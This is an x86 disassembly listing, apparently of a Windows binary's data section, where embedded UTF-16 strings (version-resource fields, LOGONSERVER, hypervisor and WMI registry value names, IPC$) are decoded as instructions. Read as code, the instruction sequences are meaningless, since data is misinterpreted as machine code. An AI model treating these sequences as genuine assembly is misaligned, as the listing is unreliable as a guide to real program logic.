  4016b9:	add    BYTE PTR [eax+eax*1+0x69],dh
  4016bd:	add    BYTE PTR [edi+0x0],ch
  4016c0:	outs   dx,BYTE PTR ds:[esi]
  4016c1:	add    BYTE PTR [esi],ch
  4016c3:	add    BYTE PTR [ecx+0x0],cl
  4016c6:	outs   dx,BYTE PTR ds:[esi]
  4016c7:	add    BYTE PTR [eax+eax*1+0x65],ah
  4016cb:	add    BYTE PTR [eax+0x0],bh
  4016ce:	cmp    eax,0x64002500
  4016d3:	add    BYTE PTR [eax],al
  4016d5:	add    BYTE PTR [eax],al
  4016d7:	add    BYTE PTR [ecx+0x0],cl
  4016da:	push   eax
  4016db:	add    BYTE PTR [ecx+0x0],al
  4016de:	add    BYTE PTR fs:[eax+eax*1+0x72],ah
  4016e3:	add    BYTE PTR [ebp+0x0],ah
  4016e6:	jae    0x4016e8
  4016e8:	jae    0x4016ea
  4016ea:	add    BYTE PTR [eax],al
  4016ec:	inc    esp
  4016ed:	add    BYTE PTR [eax+0x0],cl
  4016f0:	inc    ebx
  4016f1:	add    BYTE PTR [eax+0x0],dl
  4016f4:	push   ebx
  4016f5:	add    BYTE PTR [ebp+0x0],ah
  4016f8:	jb     0x4016fa
  4016fa:	jbe    0x4016fc
  4016fc:	add    BYTE PTR gs:[edx+0x0],dh
  401700:	add    BYTE PTR [eax],al
  401702:	add    BYTE PTR [eax],al
  401704:	inc    esp
  401705:	add    BYTE PTR [eax+0x0],cl
  401708:	inc    ebx
  401709:	add    BYTE PTR [eax+0x0],dl
  40170c:	inc    ebp
  40170d:	add    BYTE PTR [esi+0x0],ch
  401710:	popa   
  401711:	add    BYTE PTR [edx+0x0],ah
  401714:	ins    BYTE PTR es:[edi],dx
  401715:	add    BYTE PTR [ebp+0x0],ah
  401718:	add    BYTE PTR fs:[eax],al
  40171b:	add    BYTE PTR [edx+0x0],dh
  40171e:	outs   dx,DWORD PTR ds:[esi]
  40171f:	add    BYTE PTR [edi+0x0],ch
  401722:	je     0x401724
  401724:	pop    esp
  401725:	add    BYTE PTR [eax+eax*1+0x65],ah
  401729:	add    BYTE PTR [esi+0x0],ah
  40172c:	popa   
  40172d:	add    BYTE PTR [ebp+0x0],dh
  401730:	ins    BYTE PTR es:[edi],dx
  401731:	add    BYTE PTR [eax+eax*1+0x0],dh
  401735:	add    BYTE PTR [eax],al
  401737:	add    BYTE PTR [eax+eax*1+0x4f],cl
  40173b:	add    BYTE PTR [edi+0x0],al
  40173e:	dec    edi
  40173f:	add    BYTE PTR [esi+0x0],cl
  401742:	push   ebx
  401743:	add    BYTE PTR [ebp+0x0],al
  401746:	push   edx
  401747:	add    BYTE PTR [esi+0x0],dl
  40174a:	inc    ebp
  40174b:	add    BYTE PTR [edx+0x0],dl
  40174e:	add    BYTE PTR [eax],al
  401750:	push   esi
  401751:	add    BYTE PTR [edi+0x0],ch
  401754:	ins    BYTE PTR es:[edi],dx
  401755:	add    BYTE PTR [ecx+0x0],ah
  401758:	je     0x40175a
  40175a:	imul   eax,DWORD PTR [eax],0x65006c
  401760:	and    BYTE PTR [eax],al
  401762:	inc    ebp
  401763:	add    BYTE PTR [esi+0x0],ch
  401766:	jbe    0x401768
  401768:	imul   eax,DWORD PTR [eax],0x6f0072
  40176e:	outs   dx,BYTE PTR ds:[esi]
  40176f:	add    BYTE PTR [ebp+0x0],ch
  401772:	add    BYTE PTR gs:[esi+0x0],ch
  401776:	je     0x401778
  401778:	add    BYTE PTR [eax],al
  40177a:	add    BYTE PTR [eax],al
  40177c:	dec    eax
  40177d:	add    BYTE PTR [ecx+0x0],bh
  401780:	jo     0x401782
  401782:	add    BYTE PTR gs:[edx+0x0],dh
  401786:	jbe    0x401788
  401788:	imul   eax,DWORD PTR [eax],0x6f0073
  40178e:	jb     0x401790
  401790:	push   eax
  401791:	add    BYTE PTR [edx+0x0],dh
  401794:	add    BYTE PTR gs:[ebx+0x0],dh
  401798:	add    BYTE PTR gs:[esi+0x0],ch
  40179c:	je     0x40179e
  40179e:	add    BYTE PTR [eax],al
  4017a0:	push   ebx
  4017a1:	add    BYTE PTR [ebp+0x0],ah
  4017a4:	arpl   WORD PTR [eax],ax
  4017a6:	outs   dx,DWORD PTR ds:[esi]
  4017a7:	add    BYTE PTR [esi+0x0],ch
  4017aa:	add    BYTE PTR fs:[eax+eax*1+0x65],cl
  4017af:	add    BYTE PTR [esi+0x0],dh
  4017b2:	add    BYTE PTR gs:[eax+eax*1+0x41],ch
  4017b7:	add    BYTE PTR [eax+eax*1+0x64],ah
  4017bb:	add    BYTE PTR [edx+0x0],dh
  4017be:	add    BYTE PTR gs:[ebx+0x0],dh
  4017c2:	jae    0x4017c4
  4017c4:	push   esp
  4017c5:	add    BYTE PTR [edx+0x0],dh
  4017c8:	popa   
  4017c9:	add    BYTE PTR [esi+0x0],ch
  4017cc:	jae    0x4017ce
  4017ce:	ins    BYTE PTR es:[edi],dx
  4017cf:	add    BYTE PTR [ecx+0x0],ah
  4017d2:	je     0x4017d4
  4017d4:	imul   eax,DWORD PTR [eax],0x6e006f
  4017da:	inc    ebp
  4017db:	add    BYTE PTR [eax+0x0],bh
  4017de:	je     0x4017e0
  4017e0:	add    BYTE PTR gs:[esi+0x0],ch
  4017e4:	jae    0x4017e6
  4017e6:	imul   eax,DWORD PTR [eax],0x6e006f
  4017ec:	jae    0x4017ee
  4017ee:	add    BYTE PTR [eax],al
  4017f0:	push   esi
  4017f1:	add    BYTE PTR [ebp+0x0],cl
  4017f4:	dec    ebp
  4017f5:	add    BYTE PTR [edi+0x0],ch
  4017f8:	outs   dx,BYTE PTR ds:[esi]
  4017f9:	add    BYTE PTR [ecx+0x0],ch
  4017fc:	je     0x4017fe
  4017fe:	outs   dx,DWORD PTR ds:[esi]
  4017ff:	add    BYTE PTR [edx+0x0],dh
  401802:	dec    ebp
  401803:	add    BYTE PTR [edi+0x0],ch
  401806:	add    BYTE PTR fs:[ebp+0x0],ah
  40180a:	inc    ebp
  40180b:	add    BYTE PTR [eax+0x0],bh
  40180e:	je     0x401810
  401810:	add    BYTE PTR gs:[esi+0x0],ch
  401814:	jae    0x401816
  401816:	imul   eax,DWORD PTR [eax],0x6e006f
  40181c:	jae    0x40181e
  40181e:	add    BYTE PTR [eax],al
  401820:	push   esi
  401821:	add    BYTE PTR [ecx+0x0],ch
  401824:	jb     0x401826
  401826:	je     0x401828
  401828:	jne    0x40182a
  40182a:	popa   
  40182b:	add    BYTE PTR [eax+eax*1+0x69],ch
  40182f:	add    BYTE PTR [edx+0x0],bh
  401832:	popa   
  401833:	add    BYTE PTR [eax+eax*1+0x69],dh
  401837:	add    BYTE PTR [edi+0x0],ch
  40183a:	outs   dx,BYTE PTR ds:[esi]
  40183b:	add    BYTE PTR [esi+0x0],al
  40183e:	imul   eax,DWORD PTR [eax],0x6d0072
  401844:	ja     0x401846
  401846:	popa   
  401847:	add    BYTE PTR [edx+0x0],dh
  40184a:	add    BYTE PTR gs:[ebp+0x0],al
  40184e:	outs   dx,BYTE PTR ds:[esi]
  40184f:	add    BYTE PTR [ecx+0x0],ah
  401852:	bound  eax,QWORD PTR [eax]
  401854:	ins    BYTE PTR es:[edi],dx
  401855:	add    BYTE PTR [ebp+0x0],ah
  401858:	add    BYTE PTR fs:[eax],al
  40185b:	add    BYTE PTR [eax],ah
  40185d:	add    BYTE PTR [eax],al
  40185f:	add    BYTE PTR [ebp+0x0],cl
  401862:	dec    ecx
  401863:	add    BYTE PTR [ebp+0x0],cl
  401866:	inc    ebp
  401867:	add    BYTE PTR [eax+eax*1+0x44],bl
  40186b:	add    BYTE PTR [ecx+0x0],ah
  40186e:	je     0x401870
  401870:	popa   
  401871:	add    BYTE PTR [edx+0x0],ah
  401874:	popa   
  401875:	add    BYTE PTR [ebx+0x0],dh
  401878:	add    BYTE PTR gs:[eax+eax*1+0x52],bl
  40187d:	add    BYTE PTR [esi+0x0],ah
  401880:	arpl   WORD PTR [eax],ax
  401882:	xor    DWORD PTR [eax],eax
  401884:	aaa    
  401885:	add    BYTE PTR [esi],dh
  401887:	add    BYTE PTR [esi],dh
  401889:	add    BYTE PTR [eax],al
  40188b:	add    BYTE PTR [eax],al
  40188d:	add    BYTE PTR [eax],al
  40188f:	add    BYTE PTR [edi],ch
  401891:	add    BYTE PTR [ebx+0x0],bl
  401894:	pop    ebp
  401895:	add    BYTE PTR [edx],bh
  401897:	add    BYTE PTR [eax+eax*1+0x3c],bh
  40189b:	add    BYTE PTR [esi],bh
  40189d:	add    BYTE PTR [ebx],ch
  40189f:	add    BYTE PTR ds:0x2c003b00,bh
  4018a5:	add    BYTE PTR [edi],bh
  4018a7:	add    BYTE PTR [edx],ch
  4018a9:	add    BYTE PTR [eax],al
  4018ab:	add    BYTE PTR [eax+0x0],ah
  4018ae:	jle    0x4018b0
  4018b0:	and    DWORD PTR [eax],eax
  4018b2:	inc    eax
  4018b3:	add    BYTE PTR [ebx],ah
  4018b5:	add    BYTE PTR [eax+eax*1],ah
  4018b8:	pop    esi
  4018b9:	add    BYTE PTR [esi],ah
  4018bb:	add    BYTE PTR [edx],ch
  4018bd:	add    BYTE PTR [eax],ch
  4018bf:	add    BYTE PTR [ecx],ch
  4018c1:	add    BYTE PTR [ebx],ch
  4018c3:	add    BYTE PTR ds:0x5d005b00,bh
  4018c9:	add    BYTE PTR [ebx+0x0],bh
  4018cc:	jge    0x4018ce
  4018ce:	jl     0x4018d0
  4018d0:	pop    esp
  4018d1:	add    BYTE PTR [eax+eax*1],bh
  4018d4:	add    BYTE PTR ds:[eax+eax*1],ch
  4018d8:	aas    
  4018d9:	add    BYTE PTR [edi],ch
  4018db:	add    BYTE PTR [edx],ah
  4018dd:	add    BYTE PTR [edi],ah
  4018df:	add    BYTE PTR [edx],bh
  4018e1:	add    BYTE PTR [ebx],bh
  4018e3:	add    BYTE PTR [eax],al
  4018e5:	add    BYTE PTR [eax],al
  4018e7:	add    BYTE PTR [esi],ch
  4018e9:	add    BYTE PTR [eax],al
  4018eb:	add    BYTE PTR [eax+eax*1+0x5c],bl
  4018ef:	add    BYTE PTR [eax],al
  4018f1:	add    BYTE PTR [eax],al
  4018f3:	add    BYTE PTR [edx],ch
  4018f5:	add    BYTE PTR [eax],al
  4018f7:	add    BYTE PTR [edx],cl
  4018f9:	add    BYTE PTR [eax],al
  4018fb:	add    BYTE PTR [eax],dh
  4018fd:	add    BYTE PTR [eax],al
  4018ff:	add    BYTE PTR [ecx],dh
  401901:	add    BYTE PTR [esi],dh
  401903:	add    BYTE PTR [eax],dh
  401905:	add    BYTE PTR [ecx],dh
  401907:	add    BYTE PTR [eax],dh
  401909:	add    BYTE PTR [ecx],dh
  40190b:	add    BYTE PTR [eax],dh
  40190d:	add    BYTE PTR [ecx],dh
  40190f:	add    BYTE PTR [eax],dh
  401911:	add    BYTE PTR [eax],dh
  401913:	add    BYTE PTR [eax],dh
  401915:	add    BYTE PTR [eax],dh
  401917:	add    BYTE PTR [eax],dh
  401919:	add    BYTE PTR [eax],dh
  40191b:	add    BYTE PTR [esi],ch
  40191d:	add    BYTE PTR [eax],dh
  40191f:	add    BYTE PTR [eax],dh
  401921:	add    BYTE PTR [eax],dh
  401923:	add    BYTE PTR [eax],dh
  401925:	add    BYTE PTR [eax],dh
  401927:	add    BYTE PTR [eax],dh
  401929:	add    BYTE PTR [ebx],ch
  40192b:	add    BYTE PTR [eax],dh
  40192d:	add    BYTE PTR [eax],dh
  40192f:	add    BYTE PTR [eax],dh
  401931:	add    BYTE PTR [eax],al
  401933:	add    BYTE PTR [ebx+0x0],dl
  401936:	je     0x401938
  401938:	add    BYTE PTR fs:[edx+0x0],dl
  40193c:	add    BYTE PTR gs:[edi+0x0],ah
  401940:	push   eax
  401941:	add    BYTE PTR [edx+0x0],dh
  401944:	outs   dx,DWORD PTR ds:[esi]
  401945:	add    BYTE PTR [esi+0x0],dh
  401948:	add    BYTE PTR [eax],al
  40194a:	add    BYTE PTR [eax],al
  40194c:	push   0x65004400
  401951:	add    BYTE PTR [esi+0x0],ah
  401954:	dec    ebx
  401955:	add    BYTE PTR [ebp+0x0],ah
  401958:	jns    0x40195a
  40195a:	add    BYTE PTR [eax],al
  40195c:	jae    0x40195e
  40195e:	push   ebx
  40195f:	add    BYTE PTR [ebp+0x0],dh
  401962:	bound  eax,QWORD PTR [eax]
  401964:	dec    ebx
  401965:	add    BYTE PTR [ebp+0x0],ah
  401968:	jns    0x40196a
  40196a:	dec    esi
  40196b:	add    BYTE PTR [ecx+0x0],ah
  40196e:	ins    DWORD PTR es:[edi],dx
  40196f:	add    BYTE PTR [ebp+0x0],ah
  401972:	add    BYTE PTR [eax],al
  401974:	jae    0x401976
  401976:	push   esi
  401977:	add    BYTE PTR [ecx+0x0],ah
  40197a:	ins    BYTE PTR es:[edi],dx
  40197b:	add    BYTE PTR [ebp+0x0],dh
  40197e:	add    BYTE PTR gs:[esi+0x0],cl
  401982:	popa   
  401983:	add    BYTE PTR [ebp+0x0],ch
  401986:	add    BYTE PTR gs:[eax],al
  401989:	add    BYTE PTR [eax],al
  40198b:	add    BYTE PTR [edx+0x0],dl
  40198e:	add    BYTE PTR gs:[eax+eax*1+0x75],dh
  401993:	add    BYTE PTR [edx+0x0],dh
  401996:	outs   dx,BYTE PTR ds:[esi]
  401997:	add    BYTE PTR [esi+0x0],dl
  40199a:	popa   
  40199b:	add    BYTE PTR [eax+eax*1+0x75],ch
  40199f:	add    BYTE PTR [ebp+0x0],ah
  4019a2:	add    BYTE PTR [eax],al
  4019a4:	inc    edi
  4019a5:	add    BYTE PTR [ebp+0x0],ah
  4019a8:	je     0x4019aa
  4019aa:	inc    esp
  4019ab:	add    BYTE PTR [edi+0x0],dh
  4019ae:	outs   dx,DWORD PTR ds:[esi]
  4019af:	add    BYTE PTR [edx+0x0],dh
  4019b2:	add    BYTE PTR fs:[esi+0x0],dl
  4019b6:	popa   
  4019b7:	add    BYTE PTR [eax+eax*1+0x75],ch
  4019bb:	add    BYTE PTR [ebp+0x0],ah
  4019be:	add    BYTE PTR [eax],al
  4019c0:	jne    0x4019c2
  4019c2:	push   esi
  4019c3:	add    BYTE PTR [ecx+0x0],ah
  4019c6:	ins    BYTE PTR es:[edi],dx
  4019c7:	add    BYTE PTR [ebp+0x0],dh
  4019ca:	add    BYTE PTR gs:[eax],al
  4019cd:	add    BYTE PTR [eax],al
  4019cf:	add    BYTE PTR [ebx+0x0],dh
  4019d2:	push   esi
  4019d3:	add    BYTE PTR [ecx+0x0],ah
  4019d6:	ins    BYTE PTR es:[edi],dx
  4019d7:	add    BYTE PTR [ebp+0x0],dh
  4019da:	add    BYTE PTR gs:[eax],al
  4019dd:	add    BYTE PTR [eax],al
  4019df:	add    BYTE PTR [edi+0x0],al
  4019e2:	add    BYTE PTR gs:[eax+eax*1+0x53],dh
  4019e7:	add    BYTE PTR [eax+eax*1+0x72],dh
  4019eb:	add    BYTE PTR [ecx+0x0],ch
  4019ee:	outs   dx,BYTE PTR ds:[esi]
  4019ef:	add    BYTE PTR [edi+0x0],ah
  4019f2:	push   esi
  4019f3:	add    BYTE PTR [ecx+0x0],ah
  4019f6:	ins    BYTE PTR es:[edi],dx
  4019f7:	add    BYTE PTR [ebp+0x0],dh
  4019fa:	add    BYTE PTR gs:[eax],al
  4019fd:	add    BYTE PTR [eax],al
  4019ff:	add    BYTE PTR [ecx+0x0],cl
  401a02:	inc    esp
  401a03:	add    BYTE PTR [ecx+0x0],ch
  401a06:	jae    0x401a08
  401a08:	jo     0x401a0a
  401a0a:	popa   
  401a0b:	add    BYTE PTR [eax+eax*1+0x63],dh
  401a0f:	add    BYTE PTR [eax+0x0],ch
  401a12:	and    BYTE PTR [eax],al
  401a14:	add    BYTE PTR gs:[edx+0x0],dh
  401a18:	jb     0x401a1a
  401a1a:	outs   dx,DWORD PTR ds:[esi]
  401a1b:	add    BYTE PTR [edx+0x0],dh
  401a1e:	and    BYTE PTR [eax],al
  401a20:	and    eax,DWORD PTR [eax]
  401a22:	and    eax,0x6400
  401a27:	add    BYTE PTR [ebp+0x0],dl
  401a2a:	outs   dx,BYTE PTR ds:[esi]
  401a2b:	add    BYTE PTR [ebx+0x0],ch
  401a2e:	outs   dx,BYTE PTR ds:[esi]
  401a2f:	add    BYTE PTR [edi+0x0],ch
  401a32:	ja     0x401a34
  401a34:	outs   dx,BYTE PTR ds:[esi]
  401a35:	add    BYTE PTR [eax],ah
  401a37:	add    BYTE PTR [ebp+0x0],ah
  401a3a:	jb     0x401a3c
  401a3c:	jb     0x401a3e
  401a3e:	outs   dx,DWORD PTR ds:[esi]
  401a3f:	add    BYTE PTR [edx+0x0],dh
  401a42:	and    BYTE PTR [eax],al
  401a44:	xor    BYTE PTR [eax],al
  401a46:	js     0x401a48
  401a48:	and    eax,0x6c003000
  401a4d:	add    BYTE PTR [eax+0x0],bl
  401a50:	add    BYTE PTR [eax],al
  401a52:	add    BYTE PTR [eax],al
  401a54:	push   eax
  401a55:	inc    ecx
  401a56:	push   edx
  401a57:	push   ebx
  401a58:	inc    ebp
  401a59:	push   edx
  401a5a:	xor    al,BYTE PTR [eax]
  401a5c:	aas    
  401a5d:	add    BYTE PTR [eax],al
  401a5f:	add    BYTE PTR [ebx+0x0],dh
  401a62:	add    BYTE PTR [eax],al
  401a64:	jne    0x401a66
  401a66:	add    BYTE PTR [eax],al
  401a68:	jo     0x401a6a
  401a6a:	add    BYTE PTR [eax],al
  401a6c:	data16 add BYTE PTR [edi+0x0],ch
  401a70:	add    BYTE PTR [eax],al
  401a72:	add    BYTE PTR [eax],al
  401a74:	outs   dx,BYTE PTR ds:[esi]
  401a75:	add    BYTE PTR [eax+0x0],ch
  401a78:	add    BYTE PTR [eax],al
  401a7a:	add    BYTE PTR [eax],al
  401a7c:	and    eax,0x20007300
  401a81:	add    BYTE PTR [eax],al
  401a83:	add    BYTE PTR [eax+eax*1+0x25],bh
  401a87:	add    BYTE PTR [ebx+0x0],dh
  401a8a:	jl     0x401a8c
  401a8c:	add    BYTE PTR [eax],al
  401a8e:	add    BYTE PTR [eax],al
  401a90:	and    BYTE PTR [eax],al
  401a92:	or     DWORD PTR [eax],eax
  401a94:	add    BYTE PTR [eax],al
  401a96:	add    BYTE PTR [eax],al
  401a98:	and    eax,0x25000073
  401a9d:	add    BYTE PTR [ebx+0x0],ah
  401aa0:	add    BYTE PTR [eax],al
  401aa2:	add    BYTE PTR [eax],al
  401aa4:	pop    es
  401aa5:	add    BYTE PTR [eax],al
  401aa7:	add    BYTE PTR [edx],cl
  401aa9:	add    BYTE PTR [edx],cl
  401aab:	add    BYTE PTR [eax],al
  401aad:	add    BYTE PTR [eax],al
  401aaf:	add    BYTE PTR [edx+0x55],al
  401ab2:	inc    esi
  401ab3:	inc    esi
  401ab4:	inc    ebp
  401ab5:	push   edx
  401ab6:	add    BYTE PTR [eax],al
  401ab8:	add    BYTE PTR [eax],al
  401aba:	add    BYTE PTR [eax],al
  401abc:	and    eax,0x64006c00
  401ac1:	add    BYTE PTR [eax],al
  401ac3:	add    BYTE PTR ds:0x75006c00,ah
  401ac9:	add    BYTE PTR [eax],al
  401acb:	add    BYTE PTR ds:0x6600,ah
  401ad1:	add    BYTE PTR [eax],al
  401ad3:	add    BYTE PTR [eax+eax*1+0x6f],ch
  401ad7:	add    BYTE PTR [ebx+0x0],ah
  401ada:	popa   
  401adb:	add    BYTE PTR [eax+eax*1+0x68],ch
  401adf:	add    BYTE PTR [edi+0x0],ch
  401ae2:	jae    0x401ae4
  401ae4:	je     0x401ae6
  401ae6:	add    BYTE PTR [eax],al
  401ae8:	dec    ecx
  401ae9:	add    BYTE PTR [eax+0x0],dl
  401aec:	inc    ebx
  401aed:	add    BYTE PTR [eax+eax*1],ah
  401af0:	add    BYTE PTR [eax],al
  401af2:	add    BYTE PTR [eax],al
  401af4:	pop    esp
  401af5:	add    BYTE PTR [eax+eax*1+0x25],bl
  401af9:	add    BYTE PTR [ebx+0x0],dh
  401afc:	pop    esp
  401afd:	add    BYTE PTR ds:0x7300,ah
  401b03:	add    BYTE PTR [eax+eax*1+0x56],bl
  401b07:	add    BYTE PTR [ecx+0x0],ah
  401b0a:	jb     0x401b0c
  401b0c:	inc    esi
  401b0d:	add    BYTE PTR [ecx+0x0],ch
  401b10:	ins    BYTE PTR es:[edi],dx
  401b11:	add    BYTE PTR [ebp+0x0],ah
  401b14:	dec    ecx
  401b15:	add    BYTE PTR [esi+0x0],ch
  401b18:	data16 add BYTE PTR [edi+0x0],ch
  401b1c:	pop    esp
  401b1d:	add    BYTE PTR [eax+eax*1+0x72],dl
  401b21:	add    BYTE PTR [ecx+0x0],ah
  401b24:	outs   dx,BYTE PTR ds:[esi]
  401b25:	add    BYTE PTR [ebx+0x0],dh
  401b28:	ins    BYTE PTR es:[edi],dx
  401b29:	add    BYTE PTR [ecx+0x0],ah
  401b2c:	je     0x401b2e
  401b2e:	imul   eax,DWORD PTR [eax],0x6e006f
  401b34:	add    BYTE PTR [eax],al
  401b36:	add    BYTE PTR [eax],al
  401b38:	pop    esp
  401b39:	add    BYTE PTR [ebx+0x0],dl
  401b3c:	je     0x401b3e
  401b3e:	jb     0x401b40
  401b40:	imul   eax,DWORD PTR [eax],0x67006e
  401b46:	inc    esi
  401b47:	add    BYTE PTR [ecx+0x0],ch
  401b4a:	ins    BYTE PTR es:[edi],dx
  401b4b:	add    BYTE PTR [ebp+0x0],ah
  401b4e:	dec    ecx
  401b4f:	add    BYTE PTR [esi+0x0],ch
  401b52:	data16 add BYTE PTR [edi+0x0],ch
  401b56:	pop    esp
  401b57:	add    BYTE PTR ds:0x34003000,ah
  401b5d:	add    BYTE PTR [eax+0x0],bh
  401b60:	and    eax,0x34003000
  401b65:	add    BYTE PTR [eax+0x0],bh
  401b68:	pop    esp
  401b69:	add    BYTE PTR [ecx+0x0],cl
  401b6c:	outs   dx,BYTE PTR ds:[esi]
  401b6d:	add    BYTE PTR [eax+eax*1+0x65],dh
  401b71:	add    BYTE PTR [edx+0x0],dh
  401b74:	outs   dx,BYTE PTR ds:[esi]
  401b75:	add    BYTE PTR [ecx+0x0],ah
  401b78:	ins    BYTE PTR es:[edi],dx
  401b79:	add    BYTE PTR [esi+0x0],cl
  401b7c:	popa   
  401b7d:	add    BYTE PTR [ebp+0x0],ch
  401b80:	add    BYTE PTR gs:[eax],al
  401b83:	add    BYTE PTR [esi],ch
  401b85:	add    BYTE PTR [ebp+0x0],al
  401b88:	pop    eax
  401b89:	add    BYTE PTR [ebp+0x0],al
  401b8c:	add    BYTE PTR [eax],al
  401b8e:	add    BYTE PTR [eax],al
  401b90:	push   eax
  401b91:	inc    ecx
  401b92:	push   edx
  401b93:	push   ebx
  401b94:	inc    ebp
  401b95:	push   edx
  401b96:	xor    al,BYTE PTR [eax]
  401b98:	sub    eax,0x2f00
  401b9d:	add    BYTE PTR [eax],al
  401b9f:	add    BYTE PTR ds:0x7300,ah
  401ba5:	add    BYTE PTR [eax],al
  401ba7:	add    BYTE PTR ds:0x6400,ah
  401bad:	add    BYTE PTR [eax],al
  401baf:	add    BYTE PTR ds:0x2c000000,bh
  401bb5:	add    BYTE PTR [eax],ah
  401bb7:	add    BYTE PTR [eax],al
  401bb9:	add    BYTE PTR [eax],al
  401bbb:	add    BYTE PTR ds:0x3a007300,ah
  401bc1:	add    BYTE PTR [eax],al
  401bc3:	add    BYTE PTR [eax+eax*1],ch
  401bc6:	add    BYTE PTR [eax],al
  401bc8:	and    al,BYTE PTR [eax]
  401bca:	and    eax,0x22007300
  401bcf:	add    BYTE PTR [eax],al
  401bd1:	add    BYTE PTR [eax],al
  401bd3:	add    BYTE PTR [edx],ah
  401bd5:	add    BYTE PTR [eax],al
  401bd7:	add    BYTE PTR ds:0x1,bh
  401bdd:	add    BYTE PTR [eax],al
  401bdf:	add    al,al
  401be1:	add    BYTE PTR [eax],al
  401be3:	add    BYTE PTR [eax],al
  401be5:	add    BYTE PTR [eax],al
  401be7:	inc    esi
	...
  401bf0:	rol    BYTE PTR [eax],0x0
  401bf3:	add    BYTE PTR [eax],al
  401bf5:	add    BYTE PTR [eax],al
  401bf7:	inc    esi
  401bf8:	mov    ebp,0x33eb87e1
  401bfd:	xor    dl,dl
  401bff:	adc    DWORD PTR [esi+0x4fc000c9],ebp
  401c05:	mov    dh,0x88
  401c07:	and    BYTE PTR [ecx+eiz*8+0x3233eb87],bh
  401c0e:	rcl    BYTE PTR [ecx],cl
  401c10:	scas   al,BYTE PTR es:[edi]
  401c11:	leave  
  401c12:	add    al,al
  401c14:	dec    edi
  401c15:	mov    dh,0x88
  401c17:	and    BYTE PTR [ecx],dl
  401c19:	clc    
  401c1a:	nop
  401c1b:	inc    ebp
  401c1c:	cmp    bl,BYTE PTR ds:0x1f8911d0
  401c22:	add    BYTE PTR [edx+0x242e4b00],ch
  401c28:	xchg   DWORD PTR [esi+0x737fdc12],esp
  401c2e:	iret   
  401c2f:	adc    DWORD PTR [eax+0xaa004d],ecx
  401c35:	dec    ebx
  401c36:	cs and al,0x0
  401c39:	add    BYTE PTR [eax],al
  401c3b:	add    BYTE PTR [eax],al
  401c3d:	add    BYTE PTR [eax+0x3e],dh
  401c43:	add    BYTE PTR [eax],al
  401c45:	add    BYTE PTR [eax+0x3f],dl
  401c48:	add    BYTE PTR [eax],al
  401c4a:	add    BYTE PTR [eax],al
  401c4c:	add    BYTE PTR [eax],al
  401c4e:	loopne 0x401c8f
  401c50:	add    BYTE PTR [eax],al
  401c52:	add    BYTE PTR [eax],al
  401c54:	add    BYTE PTR [eax],al
  401c56:	loopne 0x401c9b
  401c58:	add    BYTE PTR [eax],al
  401c5a:	cmp    BYTE PTR [edi+0x0],0x0
  401c61:	add    BYTE PTR [eax],al
  401c63:	add    BYTE PTR [eax],al
  401c65:	add    al,dh
  401c67:	mov    edi,0x0
	...
  401c74:	push   edx
  401c75:	cmp    eax,0x559f
  401c7a:	add    BYTE PTR [eax],al
  401c7c:	add    al,BYTE PTR [eax]
  401c7e:	add    BYTE PTR [eax],al
  401c80:	and    al,0x0
  401c82:	add    BYTE PTR [eax],al
  401c84:	loopne 0x401ca3
  401c86:	add    BYTE PTR [eax],al
  401c88:	loopne 0x401c9b
  401c8a:	add    BYTE PTR [eax],al
  401c8c:	add    BYTE PTR [eax],al
  401c8e:	add    BYTE PTR [eax],al
  401c90:	push   edx
  401c91:	cmp    eax,0x559f
  401c96:	add    BYTE PTR [eax],al
  401c98:	or     eax,0xe8000000
  401c9d:	add    DWORD PTR [eax],eax
  401c9f:	add    BYTE PTR [eax],bl
  401ca1:	push   ds
  401ca2:	add    BYTE PTR [eax],al
  401ca4:	sbb    BYTE PTR [edx],dl
	...
  401cc6:	add    BYTE PTR [eax],al
  401cc8:	push   0x0
	...
  401d01:	add    BYTE PTR [eax],al
  401d03:	add    BYTE PTR [eax+edx*1],al
  401d06:	inc    ecx
  401d07:	add    BYTE PTR [eax],dh
  401d09:	sbb    eax,0x2c0040
  401d0e:	add    BYTE PTR [eax],al
  401d10:	mov    WORD PTR [edx],fs
  401d12:	inc    ecx
  401d13:	add    BYTE PTR [eax],al
  401d15:	add    BYTE PTR [eax],al
  401d17:	add    BYTE PTR [eax+edx*1],bl
  401d1a:	inc    eax
  401d1b:	add    BYTE PTR [esi],cl
  401d1d:	add    BYTE PTR [eax],al
  401d1f:	add    BYTE PTR [eax],al
  401d21:	xor    eax,0x0
	...
  401d2e:	add    BYTE PTR [eax],al
  401d30:	and    cl,ch
  401d32:	add    BYTE PTR [eax],al
  401d34:	xchg   ecx,eax
  401d35:	jmp    0x401d37
  401d37:	add    BYTE PTR [esi+0x220000eb],bh
  401d3d:	in     eax,dx
  401d3e:	add    BYTE PTR [eax],al
  401d40:	pushf  
  401d41:	in     eax,dx
  401d42:	add    BYTE PTR [eax],al
  401d44:	pop    es
  401d45:	out    dx,al
  401d46:	add    BYTE PTR [eax],al
  401d48:	inc    edx
  401d49:	out    dx,al
  401d4a:	add    BYTE PTR [eax],al
  401d4c:	jge    0x401d3c
  401d4e:	add    BYTE PTR [eax],al
  401d50:	retf   0xee
  401d53:	add    BYTE PTR ds:0x5b0000ef,al
  401d59:	out    dx,eax
  401d5a:	add    BYTE PTR [eax],al
  401d5c:	xor    dh,al
  401d5e:	add    BYTE PTR [eax],al
  401d60:	push   0xd80000f0
  401d65:	lock add BYTE PTR [eax],al
  401d68:	adc    al,0xf1
  401d6a:	add    BYTE PTR [eax],al
  401d6c:	pop    eax
  401d6d:	icebp  
  401d6e:	add    BYTE PTR [eax],al
  401d70:	xor    cl,0x0
  401d73:	add    bh,cl
  401d75:	icebp  
  401d76:	add    BYTE PTR [eax],al
  401d78:	add    dh,dl
  401d7a:	add    BYTE PTR [eax],al
  401d7c:	xor    al,0xf2
  401d7e:	add    BYTE PTR [eax],al
  401d80:	data16 repnz add BYTE PTR [eax],al
  401d84:	xchg   dl,dh
  401d86:	add    BYTE PTR [eax],al
  401d88:	and    bl,dh
  401d8a:	add    BYTE PTR [eax],al
  401d8c:	push   ebx
  401d8d:	repz add BYTE PTR [eax],al
  401d90:	xchg   edi,eax
  401d91:	repz add BYTE PTR [eax],al
  401d94:	iret   
  401d95:	repz add BYTE PTR [eax],al
  401d98:	add    esp,esi
  401d9a:	add    BYTE PTR [eax],al
  401d9c:	xor    esi,esp
  401d9e:	add    BYTE PTR [eax],al
  401da0:	data16 hlt 
  401da2:	add    BYTE PTR [eax],al
  401da4:	xchg   esi,eax
  401da5:	hlt    
  401da6:	add    BYTE PTR [eax],al
  401da8:	mov    esi,0xe60000f4
  401dad:	hlt    
  401dae:	add    BYTE PTR [eax],al
  401db0:	pmaddwd mm0,QWORD PTR [eax]
